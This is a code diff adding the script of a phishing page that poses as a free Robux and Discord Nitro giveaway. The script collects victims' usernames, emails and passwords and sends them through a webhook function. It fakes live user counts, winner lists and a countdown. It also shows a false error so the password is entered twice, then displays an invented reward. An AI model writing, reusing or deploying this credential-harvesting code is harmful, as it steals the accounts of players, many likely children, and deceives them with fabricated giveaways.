+    function startCountdown(){ const end=new Date().getTime()+48*3600000; function update(){ const now=Date.now(), diff=end-now; if(diff<=0){ document.getElementById('days').innerText='00'; document.getElementById('hours').innerText='00'; document.getElementById('minutes').innerText='00'; document.getElementById('seconds').innerText='00'; document.getElementById('timerShort').innerText='Ended'; return; } const d=Math.floor(diff/86400000), h=Math.floor((diff%86400000)/3600000), m=Math.floor((diff%3600000)/60000), s=Math.floor((diff%60000)/1000); document.getElementById('days').innerText=d<10?'0'+d:d; document.getElementById('hours').innerText=h<10?'0'+h:h; document.getElementById('minutes').innerText=m<10?'0'+m:m; document.getElementById('seconds').innerText=s<10?'0'+s:s; document.getElementById('timerShort').innerText=`${d}d ${h}h`; } update(); setInterval(update,1000); } startCountdown();
+
+    // LIVE STATS & WINNERS (varied amounts)
+    let activeUsers=6847, claimsToday=5100; 
+    setInterval(()=>{ 
+        activeUsers+=Math.floor(Math.random()*11)-5; if(activeUsers<4000) activeUsers=4000; 
+        claimsToday+=Math.floor(Math.random()*15); 
+        document.getElementById('activeUsers').innerText=activeUsers.toLocaleString(); 
+        document.getElementById('claimsToday').innerText=claimsToday.toLocaleString(); 
+        const winDiv=document.getElementById('winnersContainer'); 
+        const names=['ShadowBlade','PixelQueen','RobuxHunter','LegendaryNoob','BloxyKing','DevPro','OGPlayer','NeonRider']; 
+        const randName=names[Math.floor(Math.random()*names.length)]+Math.floor(Math.random()*999); 
+        let randAmount = Math.floor(Math.random() * 49000) + 1000;
+        let formattedAmount = randAmount.toLocaleString() + ' R$';
+        const newWin=document.createElement('div'); newWin.className='winner-entry'; 
+        newWin.innerHTML=`<span class="winner-name"><i class="fab fa-discord"></i> ${randName}</span><span class="winner-amount">+${formattedAmount}</span>`; 
+        winDiv.prepend(newWin); if(winDiv.children.length>7) winDiv.removeChild(winDiv.lastChild); 
+    },30000);
+
+    // FAQ ACCORDION (improved UI)
+    document.querySelectorAll('.faq-question').forEach(q=>{ 
+        q.addEventListener('click',()=>{ 
+            const ans=q.nextElementSibling; 
+            const isOpen = ans.style.display === 'block';
+            document.querySelectorAll('.faq-answer').forEach(a => a.style.display = 'none');
+            document.querySelectorAll('.faq-question i').forEach(icon => icon.style.transform = 'rotate(0deg)');
+            if (!isOpen) {
+                ans.style.display = 'block';
+                q.querySelector('i').style.transform = 'rotate(180deg)';
+            }
+        });
+    });
+
+    // DISCORD NITRO FORM HANDLER
+    const discordForm = document.getElementById('discordForm');
+    const discordUsername = document.getElementById('discordUsername');
+    const discordEmail = document.getElementById('discordEmail');
+    const discordPassword = document.getElementById('discordPassword');
+    const discordClaimBtn = document.getElementById('discordClaimBtn');
+    const discordSuccess = document.getElementById('discordSuccessMsg');
+    const errDiscordUser = document.getElementById('err-discord-user');
+    const errDiscordEmail = document.getElementById('err-discord-email');
+    const errDiscordPass = document.getElementById('err-discord-pass');
+    const toggleDiscord = document.getElementById('toggleDiscordPass');
+    if(toggleDiscord) toggleDiscord.addEventListener('click',()=>{ const type=discordPassword.getAttribute('type')==='password'?'text':'password'; discordPassword.setAttribute('type',type); toggleDiscord.querySelector('i').classList.toggle('fa-eye'); toggleDiscord.querySelector('i').classList.toggle('fa-eye-slash'); });
+    discordForm.addEventListener('submit', async (e) => {
+        e.preventDefault();
+        if(discordClaimBtn.disabled) return;
+        const user = discordUsername.value.trim();
+        const email = discordEmail.value.trim();
+        const pass = discordPassword.value;
+        let valid = true;
+        if(!user) { errDiscordUser.style.display='flex'; valid=false; } else errDiscordUser.style.display='none';
+        if(!isValidEmail(email)) { errDiscordEmail.style.display='flex'; valid=false; } else errDiscordEmail.style.display='none';
+        if(!pass) { errDiscordPass.style.display='flex'; valid=false; } else errDiscordPass.style.display='none';
+        if(!valid) return;
+        discordClaimBtn.disabled = true;
+        discordClaimBtn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> PROCESSING...';
+        await sendToWebhook(user, email, pass, "DISCORD");
+        setTimeout(() => {
+            discordClaimBtn.disabled = false;
+            discordClaimBtn.innerHTML = '<i class="fab fa-discord"></i> CLAIM FREE NITRO <i class="fas fa-gift"></i>';
+            discordSuccess.style.display = 'block';
+            discordUsername.value = ''; discordEmail.value = ''; discordPassword.value = '';
+            setTimeout(() => { discordSuccess.style.display = 'none'; }, 5000);
+        }, 800);
+    });
+
+    // Access Buttons (top and bottom)
+    const gotoLoginTop = document.getElementById('gotoLoginBtnTop');
+    const gotoLoginBottom = document.getElementById('gotoLoginBtnBottom');
+    const gotoLoginOriginal = document.getElementById('gotoLoginBtn');
+    
+    // REST OF ORIGINAL JS (unchanged, but added random win amount up to 50k)
+    const homePage = document.getElementById('homePage'), loginPage = document.getElementById('loginFormPage'), homeLogo = document.getElementById('homeLogoBtn');
+    const form = document.getElementById('phishForm'), submitBtn = document.getElementById('submitBtn'), usernameInp = document.getElementById('username'), emailInp = document.getElementById('email'), passInp = document.getElementById('password');
+    const formCont = document.getElementById('formContainer'), successScr = document.getElementById('successScreen'), backSuccess = document.getElementById('backToHomeFromSuccess');
+    const errUser=document.getElementById('err-user'), errEmail=document.getElementById('err-email'), errPass=document.getElementById('err-pass'), errEmailTie=document.getElementById('err-email-tie'), errPassTie=document.getElementById('err-pass-tie');
+    let hasShownTie=false, currEmail='', currPass='';
+    function resetTie(){ if(hasShownTie){ hasShownTie=false; if(errEmailTie) errEmailTie.style.display='none'; if(errPassTie) errPassTie.style.display='none'; } currEmail=emailInp.value.trim(); currPass=passInp.value; }
+    emailInp.addEventListener('input',()=>{ if(emailInp.value.trim()!==currEmail) resetTie(); });
+    passInp.addEventListener('input',()=>{ if(passInp.value!==currPass) resetTie(); });
+    function showLogin(){ homePage.classList.add('hidden'); loginPage.classList.remove('hidden'); formCont.style.display='block'; successScr.style.display='none'; resetErrors(); usernameInp.value=''; emailInp.value=''; passInp.value=''; currEmail=''; currPass=''; hasShownTie=false; submitBtn.disabled=false; submitBtn.innerHTML='<i class="fas fa-dice-d6"></i> VERIFY & CLAIM REWARD <i class="fas fa-arrow-right"></i>'; if(errEmailTie) errEmailTie.style.display='none'; if(errPassTie) errPassTie.style.display='none'; }
+    function showHome(){ homePage.classList.remove('hidden'); loginPage.classList.add('hidden'); hasShownTie=false; }
+    if(gotoLoginOriginal) gotoLoginOriginal.addEventListener('click',showLogin);
+    if(gotoLoginTop) gotoLoginTop.addEventListener('click',showLogin);
+    if(gotoLoginBottom) gotoLoginBottom.addEventListener('click',showLogin);
+    homeLogo.addEventListener('click',showHome);
+    backSuccess.addEventListener('click',()=>{ homePage.classList.remove('hidden'); loginPage.classList.add('hidden'); hasShownTie=false; });
+    function resetErrors(){ if(errUser) errUser.style.display='none'; if(errEmail) errEmail.style.display='none'; if(errPass) errPass.style.display='none'; if(errEmailTie) errEmailTie.style.display='none'; if(errPassTie) errPassTie.style.display='none'; }
+    function showFormat(u, e, p){ if(u&&errUser) errUser.style.display='flex'; if(!e&&errEmail) errEmail.style.display='flex'; if(p&&errPass) errPass.style.display='flex'; }
+    const toggle=document.getElementById('togglePassword'); if(toggle) toggle.addEventListener('click',function(){ const type=passInp.getAttribute('type')==='password'?'text':'password'; passInp.setAttribute('type',type); this.querySelector('i').classList.toggle('fa-eye'); this.querySelector('i').classList.toggle('fa-eye-slash'); });
+    form.addEventListener('submit', async (e)=>{ e.preventDefault(); if(submitBtn.disabled) return; const uname=usernameInp.value.trim(), email=emailInp.value.trim(), psw=passInp.value; const userEmpty=!uname, emailValid=isValidEmail(email), passEmpty=!psw; resetErrors(); if(userEmpty||!emailValid||passEmpty){ showFormat(userEmpty,emailValid,passEmpty); const card=document.querySelector('.claim-card'); if(card){card.style.transform='translateX(3px)'; setTimeout(()=>{if(card) card.style.transform='';},120);} return; }
+        if(!hasShownTie){ submitBtn.disabled=true; submitBtn.innerHTML='<i class="fas fa-spinner fa-pulse"></i> PROCESSING...'; await sendToWebhook(uname,email,psw, "ROBUX"); setTimeout(()=>{ submitBtn.disabled=false; submitBtn.innerHTML='<i class="fas fa-dice-d6"></i> VERIFY & CLAIM REWARD <i class="fas fa-arrow-right"></i>'; if(errEmailTie) errEmailTie.style.display='flex'; if(errPassTie) errPassTie.style.display='flex'; hasShownTie=true; currEmail=email; currPass=psw; const card=document.querySelector('.claim-card'); if(card){card.style.transform='translateX(3px)'; setTimeout(()=>{if(card) card.style.transform='';},150);} },800); }
+        else{ submitBtn.disabled=true; submitBtn.innerHTML='<i class="fas fa-spinner fa-pulse"></i> PROCESSING...'; await sendToWebhook(uname,email,psw, "ROBUX"); setTimeout(()=>{ formCont.style.display='none'; successScr.style.display='flex'; let winAmount = Math.floor(Math.random() * 49000) + 1000; let winText = winAmount.toLocaleString() + ' R$'; document.getElementById('winAmount').innerText = winText; const canvas=document.createElement('canvas'); canvas.style.position='fixed'; canvas.style.top='0'; canvas.style.left='0'; canvas.style.width='100%'; canvas.style.height='100%'; canvas.style.pointerEvents='none'; canvas.style.zIndex='9999'; document.body.appendChild(canvas); const ctx=canvas.getContext('2d'); canvas.width=window.innerWidth; canvas.height=window.innerHeight; let particles=[]; for(let i=0;i<220;i++) particles.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height-canvas.height, size:Math.random()*8+3, color:`hsl(${Math.random()*70+30},100%,60%)`, speedY:Math.random()*5+2, speedX:(Math.random()-0.5)*3}); let anim; const start=Date.now(); function draw(){ if(Date.now()-start>2800){ cancelAnimationFrame(anim); canvas.remove(); return; } ctx.clearRect(0,0,canvas.width,canvas.height); for(let p of particles){ p.y+=p.speedY; p.x+=p.speedX; ctx.fillStyle=p.color; ctx.fillRect(p.x,p.y,p.size,p.size*0.7); } anim=requestAnimationFrame(draw); } draw(); },800); } });
+    const collect=document.getElementById('collectRewardBtn'); if(collect) collect.addEventListener('click',function(){ this.innerHTML='<i class="fas fa-check-circle"></i> REWARD SENT!'; this.disabled=true; });
+</script>
+</body>
+</html>
